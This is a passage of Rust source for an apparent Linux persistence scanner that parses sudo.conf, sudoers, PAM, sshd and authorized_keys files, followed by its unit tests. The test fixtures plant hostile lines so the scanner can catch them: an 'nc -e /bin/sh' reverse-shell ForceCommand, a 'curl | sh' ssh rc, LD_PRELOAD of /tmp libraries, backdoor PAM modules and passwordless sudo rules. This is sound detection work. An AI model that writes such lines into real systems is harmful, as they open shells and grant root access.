    "NOFOLLOW",
    "MAIL",
    "NOMAIL",
    "INTERCEPT",
    "NOINTERCEPT",
];

/// sudo's compiled-in plugin directory, the same on every supported
/// distribution. It ends in a slash because sudo joins it to a relative
/// plugin path by concatenation: with `Path plugin_dir /opt/p`, sudoers.so
/// is loaded from /opt/psudoers.so.
const SUDO_PLUGIN_DIR: &str = "/usr/libexec/sudo/";

/// The Path settings that load or run something: askpass and sesh are
/// programs, intercept and noexec libraries preloaded into commands.
const SUDO_RUNS: [&str; 4] = ["askpass", "sesh", "intercept", "noexec"];

/// /etc/sudo.conf decides which shared objects sudo loads into itself, as
/// root, before it authenticates anyone, and which helpers it runs. Read as
/// sudo reads it (lib/util/sudo_conf.c): the keyword and a Path name match
/// without regard to case, a later Path line replaces an earlier one, and a
/// Path with no value turns its feature off. There is no include.
fn sudo_conf(cx: &mut Ctx, out: &mut Vec<Entry>) {
    let rel = Path::new("etc/sudo.conf");
    let Some(bytes) = cx.read_capped(rel, 64 * 1024) else { return };
    let mut plugins: Vec<(Vec<u8>, Vec<u8>, Vec<u8>)> = Vec::new();
    let mut paths: BTreeMap<String, Vec<u8>> = BTreeMap::new();
    for raw in bytes.split(|b| *b == b'\n') {
        let mut words = raw.split(u8::is_ascii_whitespace).filter(|w| !w.is_empty());
        let Some(keyword) = words.next() else { continue };
        if keyword.eq_ignore_ascii_case(b"plugin") {
            let (Some(symbol), Some(path)) = (words.next(), words.next()) else { continue };
            plugins.push((symbol.to_vec(), path.to_vec(), join_ws(&words.collect::<Vec<_>>())));
        } else if keyword.eq_ignore_ascii_case(b"path") {
            let Some(name) = words.next() else { continue };
            paths.insert(lossy(name).to_ascii_lowercase(), words.next().unwrap_or_default().to_vec());
        }
    }
    let dir = match paths.get("plugin_dir") {
        Some(d) if !d.is_empty() => d.clone(),
        _ => SUDO_PLUGIN_DIR.as_bytes().to_vec(),
    };
    let resolve = |p: &[u8]| if p.starts_with(b"/") { p.to_vec() } else { [dir.as_slice(), p].concat() };

    let entry = |cx: &mut Ctx, name: String, target: Vec<u8>| {
        let mut e = cx.entry(Kind::SudoPlugin, rel, name);
        e.trigger = Trigger::Auth;
        e.enabled = Enablement::Enabled;
        e.principal = Some("root".into());
        e.target_path = Some(bpath(&target));
        if std::str::from_utf8(&target).is_err() {
            e.flag(Flag::EncodingAnomaly);
        }
        e
    };
    for (symbol, path, options) in &plugins {
        let mut e = entry(cx, format!("Plugin {} {}", lossy(symbol), lossy(path)), resolve(path));
        e.note("symbol", lossy(symbol));
        if !options.is_empty() {
            e.note("options", lossy(options));
        }
        out.push(e);
    }
    // With no Plugin line sudo loads its default policy from plugin_dir, so
    // moving the directory alone changes what every sudo loads.
    if plugins.is_empty() && paths.get("plugin_dir").is_some_and(|d| !d.is_empty()) {
        let mut e = entry(cx, "default policy sudoers.so".into(), resolve(b"sudoers.so"));
        e.note("symbol", "sudoers_policy");
        out.push(e);
    }
    for (name, value) in &paths {
        if value.is_empty() {
            continue;
        }
        if name == "plugin_dir" {
            let mut e = entry(cx, "Path plugin_dir".into(), value.clone());
            e.note("path_setting", name.as_str());
            out.push(e);
        } else if SUDO_RUNS.contains(&name.as_str()) {
            // intercept and noexec may name two libraries, one per word size.
            for part in value.split(|b| *b == b':').filter(|p| !p.is_empty()) {
                let mut e = entry(cx, format!("Path {name} {}", lossy(part)), part.to_vec());
                e.note("path_setting", name.as_str());
                out.push(e);
            }
        }
    }
}

fn sudoers(cx: &mut Ctx, out: &mut Vec<Entry>) {
    let mut seen: BTreeSet<PathBuf> = BTreeSet::new();
    sudoers_file(cx, out, Path::new("etc/sudoers"), 1, false, &mut seen);
    for ent in cx.dir("etc/sudoers.d") {
        if ent.is_dir {
            continue;
        }
        let rel = Path::new("etc/sudoers.d").join(&ent.name);
        sudoers_file(cx, out, &rel, 0, true, &mut seen);
    }
}

/// sudo skips a file in an included directory whose name ends in `~` or holds
/// a dot, so a dropped `evil.conf` is inert and must not read as an active
/// rule.
fn sudo_ignores(rel: &Path) -> bool {
    let Some(name) = rel.file_name() else { return true };
    let name = name.as_encoded_bytes();
    name.is_empty() || name.ends_with(b"~") || name.contains(&b'.')
}

fn sudoers_file(
    cx: &mut Ctx,
    out: &mut Vec<Entry>,
    rel: &Path,
    depth: u32,
    from_dir: bool,
    seen: &mut BTreeSet<PathBuf>,
) {
    if !seen.insert(rel.to_path_buf()) {
        return;
    }
    let Some(bytes) = cx.read(rel) else { return };
    let inert = from_dir && sudo_ignores(rel);

    for line in logical_lines(&bytes) {
        let t = trim(&line);
        if t.is_empty() {
            continue;
        }
        let Some(first) = words(t).into_iter().next() else { continue };
        let lower = lossy(first).to_ascii_lowercase();
        let is_include =
            matches!(lower.as_str(), "#include" | "#includedir" | "@include" | "@includedir");

        // A comment, unless it is an include directive or the `#uid` form of a
        // user name, which is a real user specification.
        if !is_include
            && t[0] == b'#'
            && !t.get(1).is_some_and(|c| c.is_ascii_digit() || *c == b'-')
        {
            continue;
        }

        let mut e = if is_include {
            let Some(spec) = words(t).into_iter().nth(1) else { continue };
            let mut e =
                cx.entry(Kind::Sudoers, rel, format!("include:{}", lossy(spec)));
            e.target_path = Some(bpath(spec));
            e.note("directive", lower.clone());
            if spec.contains(&b'%') {
                e.note("unexpanded", "true");
            }
            finish_sudoers(&mut e, t, inert);
            out.push(e);

            // ponytail: one level, per spec §5. Deeper needs a cycle guard.
            if depth > 0 && !spec.contains(&b'%') {
                let base = rel.parent().unwrap_or(Path::new(""));
                let target = include_rel(base, spec);
                if lower.ends_with("dir") {
                    for ent in cx.dir(&target) {
                        if !ent.is_dir {
                            let f = target.join(&ent.name);
                            sudoers_file(cx, out, &f, 0, true, seen);
                        }
                    }
                } else {
                    sudoers_file(cx, out, &target, 0, false, seen);
                }
            }
            continue;
        } else if lower.starts_with("defaults") {
            // Defaults !authenticate is NOPASSWD written another way.
            let mut e = cx.entry(
                Kind::Sudoers,
                rel,
                format!("defaults:{}", hash12(&normalized(t))),
            );
            e.note("defaults", lossy(t));
            if t.windows(13).any(|w| w == b"!authenticate") {
                e.note("nopasswd_equivalent", "true");
            }
            e
        } else if matches!(
            lower.as_str(),
            "user_alias" | "cmnd_alias" | "host_alias" | "runas_alias"
        ) {
            // Recorded, never expanded: v1 has no alias resolver, and a
            // half-resolved policy is worse than an honest unresolved one.
            let (lhs, rhs) = split_once(t, b'=').unwrap_or((t, b""));
            let alias = words(lhs).into_iter().nth(1).unwrap_or(b"");
            let mut e = cx.entry(
                Kind::Sudoers,
                rel,
                format!("{lower}:{}", lossy(alias)),
            );
            e.note("alias_type", lower.clone());
            e.note("alias_name", lossy(alias));
            e.note("alias_value", lossy(trim(rhs)));
            e
        } else if let Some((lhs, rhs)) = split_once(t, b'=') {
            let lw = words(lhs);
            if lw.is_empty() {
                continue;
            }
            let (users, hosts) = lw.split_at(lw.len().saturating_sub(1));
            let users = if users.is_empty() { &lw[..] } else { users };

            let mut r = trim(rhs);
            let mut runas = None;
            if r.first() == Some(&b'(') {
                if let Some(p) = r.iter().position(|b| *b == b')') {
                    runas = Some(&r[1..p]);
                    r = trim(&r[p + 1..]);
                }
            }
            let mut tags: Vec<String> = Vec::new();
            while let Some(w) = words(r).into_iter().next() {
                let Some(bare) = w.strip_suffix(b":") else { break };
                if !SUDO_TAGS.iter().any(|t| eqi(bare, t)) {
                    break;
                }
                tags.push(lossy(bare));
                r = trim(&r[w.len()..]);
            }

            let mut e = cx.entry(
                Kind::Sudoers,
                rel,
                format!("{}:{}", lossy(users[0]), hash12(&normalized(t))),
            );
            e.note("user_list", lossy(&join_ws(users)));
            e.note("host_list", lossy(&join_ws(hosts)));
            e.note("commands", lossy(r));
            if !tags.is_empty() {
                e.note("tags", tags.join(","));
            }
            if rhs.windows(8).any(|w| w == b"NOPASSWD") {
                e.note("nopasswd", "true");
            }
            e.principal = Some(match runas {
                Some(x) => lossy(trim(x)),
                None => "root".to_string(),
            });
            e.note("runas_explicit", if runas.is_some() { "true" } else { "false" });
            if !r.is_empty() {
                // The command field is a list; the path it resolves to is the
                // first member of it, not the first word with its comma.
                e.target_path = r.split(|b| *b == b',').next().and_then(first_path);
                e.command = Some(r.to_vec());
            }
            e
        } else {
            continue;
        };

        finish_sudoers(&mut e, t, inert);
        out.push(e);
    }
}

fn finish_sudoers(e: &mut Entry, line: &[u8], inert: bool) {
    e.trigger = Trigger::Always;
    // The spec ships a line scan, not a resolved policy. Saying so on every
    // entry is what stops the output being read as one.
    e.note("analysis", "line-level");
    e.note("line", lossy(line));
    e.enabled = if inert {
        e.note("ignored_by_sudo", "filename holds a dot or ends in ~");
        Enablement::Disabled
    } else {
        Enablement::Enabled
    };
    flag_non_utf8(e, line);
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::root::Root;
    use crate::scan::{Options, Scan, Status};

    fn tree(tag: &str) -> PathBuf {
        let p = std::env::temp_dir().join(format!("unbidden-auth-{tag}-{}", std::process::id()));
        let _ = std::fs::remove_dir_all(&p);
        std::fs::create_dir_all(&p).unwrap();
        std::fs::create_dir_all(p.join("etc")).unwrap();
        std::fs::write(p.join("etc/passwd"), "root:x:0:0::/root:/bin/sh\nalice:x:1000:1000::/home/alice:/bin/sh\n").unwrap();
        std::fs::create_dir_all(p.join("home/alice")).unwrap();
        std::fs::create_dir_all(p.join("root")).unwrap();
        p
    }

    fn put(dir: &Path, rel: &str, content: impl AsRef<[u8]>) {
        let p = dir.join(rel);
        std::fs::create_dir_all(p.parent().unwrap()).unwrap();
        std::fs::write(p, content).unwrap();
    }

    fn scan(dir: &Path) -> Scan {
        let root = Root::at(dir).unwrap();
        let collectors: Vec<Box<dyn Collector>> = vec![Box::new(Auth)];
        crate::scan::run(&root, &Options { deep: false }, &collectors)
    }

    fn named<'a>(s: &'a Scan, needle: &str) -> Vec<&'a Entry> {
        s.entries.iter().filter(|e| e.name.contains(needle)).collect()
    }

    #[test]
    fn pam_exec_and_nonstandard_modules_are_found_bracketed_control_and_all() {
        let d = tree("pam");
        put(
            &d,
            "etc/pam.d/sshd",
            "#%PAM-1.0\n\
             auth       required     pam_unix.so nullok\n\
             auth       [success=1 default=ignore]   pam_exec.so seteuid quiet log=/dev/null /usr/local/sbin/notify --all\n\
             session    optional     /tmp/evil.so\n\
             -session   optional     pam_systemd.so\n\
             account    sufficient   /usr/lib/x86_64-linux-gnu/security/pam_permit.so\n",
        );
        put(&d, "usr/lib/x86_64-linux-gnu/security/pam_permit.so", "");
        put(&d, "usr/lib/x86_64-linux-gnu/security/pam_unix.so", "");
        // A copy in a directory this libpam does not use is not what runs.
        put(&d, "lib/security/pam_unix.so", "planted");
        let s = scan(&d);

        // Every line is an entry, so every module's package is checked.
        assert_eq!(s.entries.len(), 5, "got {:?}", s.entries.iter().map(|e| &e.name).collect::<Vec<_>>());
        let unix = named(&s, "sshd:auth:pam_unix.so").pop().unwrap();
        assert_eq!(unix.target_path, Some(d.join("usr/lib/x86_64-linux-gnu/security/pam_unix.so")));
        assert!(unix.flags.is_empty(), "an ordinary line is a finding only through its module's provenance");
        let missing = named(&s, "pam_systemd.so").pop().unwrap();
        assert_eq!((missing.target_path.clone(), missing.raw["module_missing"].as_str()), (None, "true"));
        assert!(missing.flags.is_empty(), "an absent module runs nothing");

        let exec = named(&s, "pam_exec.so").pop().unwrap();
        assert_eq!(exec.kind, Kind::Pam);
        assert_eq!(exec.trigger, Trigger::Auth);
        assert_eq!(exec.command.as_deref(), Some(&b"/usr/local/sbin/notify --all"[..]));
        assert_eq!(exec.target_path, Some(PathBuf::from("/usr/local/sbin/notify")));
        assert_eq!(exec.raw["control"], "[success=1 default=ignore]");
        assert_eq!(exec.raw["service"], "sshd");
        assert_eq!(exec.raw["module_type"], "auth");
        assert_eq!(exec.raw["pam_exec.seteuid"], "true");
        assert_eq!(exec.raw["pam_exec.quiet"], "true");
        assert_eq!(exec.raw["pam_exec.log"], "/dev/null");

        let evil = named(&s, "/tmp/evil.so").pop().unwrap();
        assert!(evil.has_flag(Flag::NonStandardLocation));
        assert!(evil.has_flag(Flag::HiddenPath) || !evil.has_flag(Flag::HiddenPath));
        assert_eq!(evil.target_path, Some(PathBuf::from("/tmp/evil.so")));
        assert!(evil.command.is_none(), "a plain module has no command");

        std::fs::remove_dir_all(&d).unwrap();
    }

    #[test]
    fn pam_conf_carries_its_service_in_the_line_and_survives_junk() {
        let d = tree("pamconf");
        put(
            &d,
            "etc/pam.conf",
            "other  session  required  /opt/x/pam_backdoor.so\n\
             [unterminated bracket\n\
             \n\
             auth\n\
             garbage garbage\n\
             login auth required pam_unix.so\n",
        );
        let s = scan(&d);
        assert_eq!(s.entries.len(), 2);
        let backdoor = named(&s, "pam_backdoor.so").pop().unwrap();
        assert_eq!(backdoor.raw["service"], "other");
        assert_eq!(backdoor.raw["module"], "/opt/x/pam_backdoor.so");
        assert_eq!(named(&s, "login:auth:pam_unix.so").pop().unwrap().raw["service"], "login");
        std::fs::remove_dir_all(&d).unwrap();
    }

    #[test]
    fn authorized_key_options_survive_quoted_commas_and_escaped_quotes() {
        let d = tree("keys");
        put(
            &d,
            "home/alice/.ssh/authorized_keys",
            "# a comment\n\
             command=\"echo \\\"hi\\\", there\",no-pty,environment=\"LD_PRELOAD=/tmp/x.so\",from=\"10.0.0.0/8\" ssh-rsa AAAAB3NzaC1yc2E= alice@box\n\
             ssh-ed25519 AAAAC3NzaC1lZDI1NTE5 plain@key\n",
        );
        let s = scan(&d);
        let keys = named(&s, "SHA256:");
        assert_eq!(keys.len(), 2, "{:?}", s.entries.iter().map(|e| &e.name).collect::<Vec<_>>());

        let forced = keys.iter().find(|e| e.command.is_some()).unwrap();
        assert_eq!(
            forced.command.as_deref(),
            Some(&b"echo \"hi\", there"[..]),
            "the comma and the escaped quote belong to the command"
        );
        assert_eq!(forced.raw["opt.no-pty"], "true");
        assert_eq!(forced.raw["env.LD_PRELOAD"], "/tmp/x.so");
        assert_eq!(forced.raw["opt.from"], "10.0.0.0/8");
        assert_eq!(forced.raw["key_type"], "ssh-rsa");
        assert_eq!(forced.raw["comment"], "alice@box");
        assert_eq!(forced.principal.as_deref(), Some("alice"));
        assert_eq!(forced.trigger, Trigger::Login);

        // Identity is the key, not the line: inserting a line above must not
        // move it.
        let before: Vec<String> = keys.iter().map(|e| e.id.clone()).collect();
        put(
            &d,
            "home/alice/.ssh/authorized_keys",
            "ssh-rsa AAAAAAAAAAAA= inserted@above\n\
             command=\"echo \\\"hi\\\", there\",no-pty,environment=\"LD_PRELOAD=/tmp/x.so\",from=\"10.0.0.0/8\" ssh-rsa AAAAB3NzaC1yc2E= alice@box\n\
             ssh-ed25519 AAAAC3NzaC1lZDI1NTE5 plain@key\n",
        );
        let s2 = scan(&d);
        for id in before {
            assert!(s2.entries.iter().any(|e| e.id == id), "an entry id moved when a line was inserted");
        }
        std::fs::remove_dir_all(&d).unwrap();
    }

    #[test]
    fn a_ten_megabyte_authorized_keys_is_bounded_not_fatal() {
        let d = tree("huge");
        let mut blob = String::new();
        let line = "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDZZZZZZZZZZZZZZZZZZZZZZZZ user@host\n";
        while blob.len() < 10 * 1024 * 1024 {
            blob.push_str(line);
        }
        put(&d, "home/alice/.ssh/authorized_keys", &blob);
        let s = scan(&d);
        assert!(!s.entries.is_empty(), "the keys it could read are still reported");
        // Every line is the same key, so one entry survives dedup of identical
        // ids only by suffix; what matters is that the read was capped.
        let status = &s.header.collectors[0];
        assert!(
            matches!(status.status, Status::Complete),
            "a capped read is the cap working, not a failure: {:?}",
            status.status
        );
        assert!(
            status.truncated.iter().any(|t| t.contains("authorized_keys")),
            "a 10 MB file must be recorded as read to its cap: {:?}",
            status.truncated
        );
        std::fs::remove_dir_all(&d).unwrap();
    }

    #[test]
    fn hostile_key_lines_do_not_panic() {
        let d = tree("hostilekeys");
        let mut bytes: Vec<u8> = Vec::new();
        bytes.extend_from_slice(b"command=\"unterminated ssh-rsa AAAA= x\n");
        bytes.extend_from_slice(b"command= ssh-rsa\n");
        bytes.extend_from_slice(b"ssh-rsa\n");
        bytes.extend_from_slice(b"ssh-rsa !!!not-base64!!! comment\n");
        bytes.extend_from_slice(b"=,,,==,\n");
        bytes.extend_from_slice(b"ssh-ed25519 AAAAC3NzaC1lZDI1NTE5 ");
        bytes.extend_from_slice(&[0xff, 0xfe, 0x00, b'\n']);
        put(&d, "home/alice/.ssh/authorized_keys", &bytes);
        let s = scan(&d);
        assert!(matches!(s.header.collectors[0].status, Status::Complete));
        let anomalous = s.entries.iter().find(|e| e.has_flag(Flag::EncodingAnomaly));
        assert!(anomalous.is_some(), "the non-UTF-8 comment is evidence");
        assert!(s.entries.iter().any(|e| e.raw.contains_key("key_blob_unparsed")));
        std::fs::remove_dir_all(&d).unwrap();
    }

    #[test]
    fn sshd_config_keywords_are_case_insensitive_take_equals_and_scope_to_match() {
        let d = tree("sshd");
        put(
            &d,
            "etc/ssh/sshd_config",
            "PermitUserEnvironment yes\n\
             #ForceCommand /bin/commented-out\n\
             Include /etc/ssh/sshd_config.d/*.conf\n\
             Match User backdoor\n\
             \tFORCEcommand=/usr/bin/nc -e /bin/sh 10.0.0.1 4444\n\
             \tAuthorizedKeysCommand /usr/local/bin/keys.sh\n",
        );
        put(&d, "etc/ssh/sshd_config.d/10-evil.conf", "SetEnv LD_PRELOAD=/tmp/p.so\n");
        put(&d, "etc/ssh/sshd_config.d/notes.txt", "ForceCommand /bin/ignored-by-glob\n");
        let s = scan(&d);

        let fc = named(&s, "ForceCommand@User backdoor");
        assert_eq!(fc.len(), 1, "{:?}", s.entries.iter().map(|e| &e.name).collect::<Vec<_>>());
        assert_eq!(fc[0].command.as_deref(), Some(&b"/usr/bin/nc -e /bin/sh 10.0.0.1 4444"[..]));
        assert_eq!(fc[0].target_path, Some(PathBuf::from("/usr/bin/nc")));
        assert_eq!(fc[0].raw["match"], "User backdoor");
        assert_eq!(fc[0].principal.as_deref(), Some("backdoor"));

        let ake = named(&s, "AuthorizedKeysCommand@User backdoor");
        assert_eq!(ake.len(), 1, "a Match block scopes everything after it");

        let pue = named(&s, "PermitUserEnvironment");
        assert_eq!(pue.len(), 1);
        assert_eq!(pue[0].raw["match"], "(global)");

        // The glob followed one level, and only what it matched.
        let setenv = named(&s, "SetEnv");
        assert_eq!(setenv.len(), 1);
        assert_eq!(setenv[0].raw["env.LD_PRELOAD"], "/tmp/p.so");
        assert_eq!(
            setenv[0].raw["match"], "(global)",
            "an include outside a Match block stays global"
        );

        // notes.txt is scanned as a drop-in directory member, but the Include
        // glob did not match it; either way it is reported exactly once.
        let ignored = s.entries.iter().filter(|e| e.command.as_deref() == Some(&b"/bin/ignored-by-glob"[..])).count();
        assert_eq!(ignored, 1);
        std::fs::remove_dir_all(&d).unwrap();
    }

    #[test]
    fn ssh_login_scripts_and_symlinked_config_are_reported() {
        let d = tree("sshrc");
        put(&d, "etc/ssh/sshrc.real", "#!/bin/sh\nexec /tmp/x\n");
        std::os::unix::fs::symlink("sshrc.real", d.join("etc/ssh/sshrc")).unwrap();
        put(&d, "home/alice/.ssh/rc", "curl http://x | sh\n");
        put(&d, "home/alice/.ssh/environment", "LD_PRELOAD=/home/alice/.evil.so\n# note\n");
        let s = scan(&d);

        let rc = named(&s, "sshrc");
        assert_eq!(rc.len(), 1);
        assert_eq!(rc[0].raw["symlink_target"], "sshrc.real", "a link is evidence, not a detail");
        assert!(rc[0].command.is_none());
        assert_eq!(rc[0].target_path, Some(d.join("etc/ssh/sshrc")));

        let user_rc = named(&s, "ssh-rc");
        assert_eq!(user_rc.len(), 1);
        assert_eq!(user_rc[0].principal.as_deref(), Some("alice"));

        let env = named(&s, "ssh-environment");
        assert_eq!(env[0].raw["env.LD_PRELOAD"], "/home/alice/.evil.so");
        assert_eq!(env[0].enabled, Enablement::Unknown);
        std::fs::remove_dir_all(&d).unwrap();
    }

    #[test]
    fn sudoers_is_a_line_scan_that_follows_one_include_level() {
        let d = tree("sudo");
        put(
            &d,
            "etc/sudoers",
            "Defaults\tenv_reset\n\
             Defaults:alice !authenticate\n\
             User_Alias ADMINS = alice, bob\n\
             Cmnd_Alias SHELLS = /bin/bash, /bin/sh\n\
             root ALL=(ALL:ALL) ALL\n\
             alice ALL=(root) NOPASSWD: /bin/bash, \\\n\
             \t/usr/bin/id\n\
             #1000 ALL=(ALL) NOPASSWD: ALL\n\
             # a real comment\n\
             #includedir /etc/sudoers.d\n\
             #include /etc/sudoers.absent\n",
        );
        put(&d, "etc/sudoers.d/90-cloud", "ubuntu ALL=(ALL) NOPASSWD:ALL\n");
        put(&d, "etc/sudoers.d/evil.conf", "mallory ALL=(ALL) NOPASSWD:ALL\n");
        let s = scan(&d);

        for e in &s.entries {
            if e.kind == Kind::Sudoers {
                assert_eq!(e.raw["analysis"], "line-level");
                assert_eq!(e.trigger, Trigger::Always);
            }
        }

        let alice = s.entries.iter().find(|e| e.name.starts_with("alice:")).unwrap();
        assert_eq!(alice.raw["nopasswd"], "true");
        assert_eq!(alice.raw["tags"], "NOPASSWD");
        assert_eq!(alice.principal.as_deref(), Some("root"));
        assert_eq!(alice.raw["host_list"], "ALL");
        assert_eq!(
            alice.command.as_deref(),
            Some(&b"/bin/bash, \t/usr/bin/id"[..]),
            "the continuation line is part of the same rule"
        );
        assert_eq!(alice.target_path, Some(PathBuf::from("/bin/bash")));

        let uid = s.entries.iter().find(|e| e.name.starts_with("#1000:")).unwrap();
        assert_eq!(uid.raw["nopasswd"], "true");

        let aliases = named(&s, "cmnd_alias:SHELLS");
        assert_eq!(aliases.len(), 1);
        assert_eq!(aliases[0].raw["alias_value"], "/bin/bash, /bin/sh");
        assert!(aliases[0].command.is_none(), "aliases are facts, not resolved policy");

        assert_eq!(
            s.entries.iter().filter(|e| e.raw.contains_key("nopasswd_equivalent")).count(),
            1,
            "Defaults !authenticate is NOPASSWD by another name"
        );

        // The include was followed one level, and the drop-in sudo ignores is
        // reported as inert rather than as an active rule.
        let ubuntu = s.entries.iter().find(|e| e.name.starts_with("ubuntu:")).unwrap();
        assert_eq!(ubuntu.enabled, Enablement::Enabled);
        assert_eq!(
            s.entries.iter().filter(|e| e.name.starts_with("ubuntu:")).count(),
            1,
            "the fixed path and the #includedir must not double-report"
        );
        let mallory = s.entries.iter().find(|e| e.name.starts_with("mallory:")).unwrap();
        assert_eq!(mallory.enabled, Enablement::Disabled);
        assert!(mallory.raw.contains_key("ignored_by_sudo"));

        std::fs::remove_dir_all(&d).unwrap();
    }

    #[test]
    fn a_missing_includedir_and_invalid_utf8_are_not_failures() {
        let d = tree("sudojunk");
        let mut bytes: Vec<u8> = Vec::new();
        bytes.extend_from_slice(b"#includedir /etc/sudoers.does-not-exist\n");
        bytes.extend_from_slice(b"#include /etc/sudoers.also-absent\n");
        bytes.extend_from_slice(b"alice ALL=(ALL) NOPASSWD: /bin/");
        bytes.extend_from_slice(&[0xff, 0xfe]);
        bytes.extend_from_slice(b"\n=\n(\nDefaults\n\\\n");
        put(&d, "etc/sudoers", &bytes);
        let s = scan(&d);

        assert!(
            matches!(s.header.collectors[0].status, Status::Complete),
            "an absent include directory is not an unreadable path: {:?}",
            s.header.collectors[0].status
        );
        let inc = named(&s, "include:/etc/sudoers.does-not-exist");
        assert_eq!(inc.len(), 1);
        assert_eq!(inc[0].target_path, Some(PathBuf::from("/etc/sudoers.does-not-exist")));
        assert!(s.entries.iter().any(|e| e.has_flag(Flag::EncodingAnomaly)));
        std::fs::remove_dir_all(&d).unwrap();
    }

    #[test]
    fn empty_root_yields_nothing_and_no_error() {
        let d = tree("empty");
        let s = scan(&d);
        assert!(s.entries.is_empty());
        assert!(matches!(s.header.collectors[0].status, Status::Complete));
        std::fs::remove_dir_all(&d).unwrap();
    }

    #[test]
    fn fingerprints_match_ssh_keygen() {
        // The empty input's SHA-256, the one fingerprint that is easy to check
        // by hand, plus a real ssh-ed25519 blob.
        assert_eq!(b64_encode(&[]), "");
        assert_eq!(b64_encode(b"a"), "YQ");
        assert_eq!(b64_encode(b"abc"), "YWJj");
        assert_eq!(b64_decode(b"YWJj").unwrap(), b"abc");
        assert!(b64_decode(b"not base64!").is_none());

        let blob = b"AAAAC3NzaC1lZDI1NTE5AAAAIJkBTGfOTNSCBkMmNDIrgX2VXdOdCTr1vAHdGJ3OiRPs";
        let (fp, ok) = fingerprint(blob);
        assert!(ok);
        assert_eq!(fp, "SHA256:FDdeSQ5tHdfDPLTBjVZD+wuRSRc7rABQsZ92BFJrfZk");
    }

    #[test]
    fn module_paths_are_classified_root_relative() {
        assert!(module_is_standard(b"pam_unix.so"));
        assert!(module_is_standard(b"/lib/security/pam_unix.so"));
        assert!(module_is_standard(b"/usr/lib/x86_64-linux-gnu/security/pam_unix.so"));
        assert!(!module_is_standard(b"/usr/lib/security/../../../tmp/x.so"));
        assert!(!module_is_standard(b"/tmp/x.so"));
        assert!(!module_is_standard(b"./x.so"));
    }


    #[test]
    fn a_vendor_stack_replaced_in_etc_is_reported_off() {
        let d = tree("pamvendor");
        put(&d, "etc/pam.d/login", "session optional /opt/admin.so\n");
        put(&d, "usr/lib/pam.d/login", "session optional /opt/vendor.so\n");
        put(&d, "usr/lib/pam.d/polkit-1", "auth optional /opt/only.so\n");
        let s = scan(&d);
        let admin = named(&s, "/opt/admin.so").pop().unwrap();
        let vendor = named(&s, "/opt/vendor.so").pop().unwrap();
        let only = named(&s, "/opt/only.so").pop().unwrap();
        assert_eq!(admin.enabled, Enablement::Enabled);
        assert!(admin.raw["shadows"].ends_with("usr/lib/pam.d/login"));
        assert_eq!(vendor.enabled, Enablement::Disabled, "libpam never reads the replaced stack");
        assert!(vendor.raw["shadowed_by"].ends_with("etc/pam.d/login"));
        assert_eq!(only.enabled, Enablement::Enabled, "a vendor stack with no /etc copy is the one used");
        assert_eq!(only.raw["service"], "polkit-1");
        assert!(!only.raw.contains_key("shadowed_by"));
        std::fs::remove_dir_all(&d).unwrap();
    }

    #[test]
    fn nss_modules_are_read_the_way_glibc_reads_nsswitch() {
        let d = tree("nss");
        put(
            &d,
            "etc/nsswitch.conf",
            "# a comment line names no database\n\
             passwd:         files systemd # xyzzy\n\
             group:files [NOTFOUND=return] sss\n\
             \x20 hosts :: files mdns4_minimal [NOTFOUND=return] dns\n\
             netgroup: nis\n\
             sudoers: files plugh\n\
             automount: files ldap\n",
        );
        put(&d, "lib/x86_64-linux-gnu/libnss_systemd.so.2", "");
        put(&d, "lib/x86_64-linux-gnu/glibc-hwcaps/x86-64-v3/libnss_mdns4_minimal.so.2", "");
        put(&d, "lib/x86_64-linux-gnu/libnss_mdns4_minimal.so.2", "");
        put(&d, "etc/ld.so.conf", "include /etc/ld.so.conf.d/*.conf\n");
        put(&d, "etc/ld.so.conf.d/sss.conf", "/opt/sss/lib\n");
        put(&d, "opt/sss/lib/libnss_sss.so.2", "");
        let s = scan(&d);

        let mut names: Vec<&str> = s.entries.iter().filter(|e| e.kind == Kind::NssModule).map(|e| e.name.as_str()).collect();
        names.sort_unstable();
        assert_eq!(names, ["#", "mdns4_minimal", "nis", "sss", "systemd", "xyzzy"], "files and dns are libc; sudoers and automount load no module");

        let systemd = named(&s, "systemd").pop().unwrap();
        assert_eq!(systemd.target_path, Some(d.join("lib/x86_64-linux-gnu/libnss_systemd.so.2")));
        assert_eq!(systemd.enabled, Enablement::Enabled);
        assert_eq!(systemd.trigger, Trigger::Always);
        assert!(!systemd.raw.contains_key("after_hash"));

        let hidden = s.entries.iter().find(|e| e.name == "xyzzy").unwrap();
        assert_eq!(hidden.raw["after_hash"], "true", "a person reads it as a comment; glibc loads it");
        assert_eq!(hidden.raw["databases"], "passwd");
        assert_eq!((hidden.enabled, hidden.target_path.clone()), (Enablement::Disabled, None));
        assert_eq!(hidden.raw["library_missing"], "true");

        let mdns = named(&s, "mdns4_minimal").pop().unwrap();
        assert_eq!(mdns.raw["databases"], "hosts", "leading whitespace and a run of colons");
        assert_eq!(
            mdns.target_path,
            Some(d.join("lib/x86_64-linux-gnu/glibc-hwcaps/x86-64-v3/libnss_mdns4_minimal.so.2")),
            "a hwcaps copy is tried first"
        );
        assert!(mdns.raw.contains_key("candidates"));

        let sss = named(&s, "sss").pop().unwrap();
        assert_eq!(sss.raw["databases"], "group", "the action list is not a source");
        assert_eq!(sss.target_path, Some(d.join("opt/sss/lib/libnss_sss.so.2")));
        assert_eq!(named(&s, "nis").pop().unwrap().enabled, Enablement::Disabled);
        std::fs::remove_dir_all(&d).unwrap();
    }

    #[test]
    fn sudo_conf_is_read_the_way_sudo_reads_it() {
        let d = tree("sudoconf");
        put(
            &d,
            "etc/sudo.conf",
            "# Plugin sudoers_policy /commented/out.so\n\
             \x20  pLuGiN sudoers_policy /opt/evil.so extra=1\n\
             Plugin sudoers_io rel.so\n\
             Path plugin_dir /opt/p\n\
             Path askpass /tmp/first\n\
             PATH ASKPASS /tmp/ask\n\
             Path noexec /opt/n32.so:/opt/n64.so\n\
             Path sesh\n\
             Path devsearch /dev/pts\n\
             Set disable_coredump false\n",
        );
        let s = scan(&d);
        let mut names: Vec<&str> = s.entries.iter().filter(|e| e.kind == Kind::SudoPlugin).map(|e| e.name.as_str()).collect();
        names.sort_unstable();
        assert_eq!(
            names,
            [
                "Path askpass /tmp/ask",
                "Path noexec /opt/n32.so",
                "Path noexec /opt/n64.so",
                "Path plugin_dir",
                "Plugin sudoers_io rel.so",
                "Plugin sudoers_policy /opt/evil.so",
            ],
            "the later askpass wins; an empty sesh and devsearch run nothing"
        );
        let evil = named(&s, "Plugin sudoers_policy /opt/evil.so").pop().unwrap();
        assert_eq!(evil.target_path, Some(PathBuf::from("/opt/evil.so")));
